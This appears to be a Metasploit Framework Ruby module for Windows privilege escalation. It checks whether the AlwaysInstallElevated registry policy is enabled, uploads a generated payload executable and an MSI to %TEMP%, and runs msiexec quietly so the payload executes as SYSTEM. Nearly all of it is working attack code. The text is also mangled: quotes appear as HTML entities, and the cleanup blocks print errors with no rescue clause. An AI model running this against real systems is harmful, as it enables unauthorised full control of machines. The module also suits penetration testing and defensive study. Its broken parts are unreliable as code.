# This file is part of the Metasploit Framework and may be subject to
# redistribution and commercial restrictions. Please see the Metasploit
# web site for more information on licensing and terms of use.
#   http://metasploit.com/
##
 
require &#039;msf/core&#039;
require &#039;rex&#039;
require &#039;msf/core/post/windows/registry&#039;
require &#039;msf/core/post/common&#039;
require &#039;msf/core/post/file&#039;
 
class Metasploit3 < Msf::Exploit::Local
    Rank = AverageRanking
 
    include Msf::Exploit::EXE
    include Msf::Post::Common
    include Msf::Post::File
    include Msf::Post::Windows::Registry
 
    def initialize(info={})
        super(update_info(info, {
            &#039;Name&#039;          => &#039;Windows AlwaysInstallElevated MSI&#039;,
            &#039;Description&#039;    => %q{
                    This module checks the AlwaysInstallElevated registry keys which dictate if
                .MSI files should be installed with elevated privileges (NT AUTHORITY\SYSTEM).
 
                The default MSI file is data/exploits/exec_payload.msi with the WiX source file
                under external/source/exploits/exec_payload_msi/exec_payload.wxs. This MSI simply
                executes payload.exe within the same folder.
 
                The MSI may not execute succesfully successive times, but may be able to get around
                this by regenerating the MSI.
 
                MSI can be rebuilt from the source using the WIX tool with the following commands:
                candle exec_payload.wxs
                light exec_payload.wixobj
            },
            &#039;License&#039;       => MSF_LICENSE,
            &#039;Author&#039;        =>
                [
                    &#039;Ben Campbell&#039;,
                    &#039;Parvez Anwar&#039; # discovery?/inspiration
                ],
            &#039;Arch&#039;          => [ ARCH_X86, ARCH_X86_64 ],
            &#039;Platform&#039;      => [ &#039;win&#039; ],
            &#039;DefaultOptions&#039; =>
                {
                    &#039;WfsDelay&#039; => 10,
                    &#039;EXITFUNC&#039; => &#039;thread&#039;,
                    &#039;InitialAutoRunScript&#039; => &#039;migrate -k -f&#039;
                },
            &#039;Targets&#039;       =>
                [
                    [ &#039;Windows&#039;, { } ],
                ],
            &#039;References&#039;    =>
                [
                    [ &#039;URL&#039;, &#039;http://www.greyhathacker.net/?p=185&#039; ],
                    [ &#039;URL&#039;, &#039;http://msdn.microsoft.com/en-us/library/aa367561(VS.85).aspx&#039; ],
                    [ &#039;URL&#039;, &#039;http://wix.sourceforge.net&#039;] ,
                ],
            &#039;DisclosureDate&#039;=> &#039;Mar 18 2010&#039;,
            &#039;DefaultTarget&#039; => 0
        }))
 
        register_advanced_options([
            OptString.new(&#039;LOG_FILE&#039;, [false, &#039;Remote path to output MSI log file to.&#039;, nil]),
            OptBool.new(&#039;QUIET&#039;, [true, &#039;Run the MSI with the /quiet flag.&#039;, true])
        ], self.class)
    end
 
    def check
        install_elevated = "AlwaysInstallElevated"
        installer = "SOFTWARE\\Policies\\Microsoft\\Windows\\Installer"
        hkcu = "HKEY_CURRENT_USER\\#{installer}"
        hklm = "HKEY_LOCAL_MACHINE\\#{installer}"
 
        local_machine_value = registry_getvaldata(hklm,install_elevated)
 
        if local_machine_value.nil?
            print_error("#{hklm}\\#{install_elevated} does not exist or is not accessible.")
            return Msf::Exploit::CheckCode::Safe
        elsif local_machine_value == 0
            print_error("#{hklm}\\#{install_elevated} is #{local_machine_value}.")
            return Msf::Exploit::CheckCode::Safe
        else
            print_good("#{hklm}\\#{install_elevated} is #{local_machine_value}.")
            current_user_value = registry_getvaldata(hkcu,install_elevated)
        end
 
        if current_user_value.nil?
            print_error("#{hkcu}\\#{install_elevated} does not exist or is not accessible.")
            return Msf::Exploit::CheckCode::Safe
        elsif current_user_value == 0
            print_error("#{hkcu}\\#{install_elevated} is #{current_user_value}.")
            return Msf::Exploit::CheckCode::Safe
        else
            print_good("#{hkcu}\\#{install_elevated} is #{current_user_value}.")
            return Msf::Exploit::CheckCode::Vulnerable
        end
    end
 
    def cleanup
        if not @executed
            return
        end
 
        begin
            print_status("Deleting MSI...")
            file_rm(@msi_destination)
            print_error(e.to_s)
            print_error("Failed to delete MSI #{@msi_destination}, manual cleanup may be required.")
        end
 
        begin
            print_status("Deleting Payload...")
            file_rm(@payload_destination)
            print_error(e.to_s)
            print_error("Failed to delete payload #{@payload_destination}, this is expected if the exploit is successful, manual cleanup may be required.")
        end
    end
 
    def exploit
 
        if check != Msf::Exploit::CheckCode::Vulnerable
            @executed = false
            return
        end
 
        @executed = true
 
        msi_filename = "exec_payload.msi" # Rex::Text.rand_text_alpha((rand(8)+6)) + ".msi"
        msi_source = ::File.join(Msf::Config.install_root, "data", "exploits", "exec_payload.msi")
 
        # Upload MSI
        @msi_destination = expand_path("%TEMP%\\#{msi_filename}").strip # expand_path in Windows Shell adds a newline and has to be stripped
        print_status("Uploading the MSI to #{@msi_destination} ...")
 
        #upload_file - ::File.read doesn&#039;t appear to work in windows...
        source = File.open(msi_source, "rb"){|fd| fd.read(fd.stat.size) }
        write_file(@msi_destination, source)
 
        # Upload payload
        payload = generate_payload_exe
        @payload_destination = expand_path("%TEMP%\\payload.exe").strip
        print_status("Uploading the Payload to #{@payload_destination} ...")
        write_file(@payload_destination, payload)
 
        # Execute MSI
        print_status("Executing MSI...")
 
        if datastore[&#039;LOG_FILE&#039;].nil?
            logging = ""
        else
            logging = "/l* #{datastore[&#039;LOG_FILE&#039;]} "
        end
 
        if datastore[&#039;QUIET&#039;]
            quiet = "/quiet "
        else
            quiet = ""
        end
 
        cmd = "msiexec.exe #{logging}#{quiet}/package #{@msi_destination}"
        vprint_status("Executing: #{cmd}")
        begin
            result = cmd_exec(cmd)
        rescue Rex::TimeoutError
            vprint_status("Execution timed out.")
        end
        vprint_status("MSI command-line feedback: #{result}")
    end
end

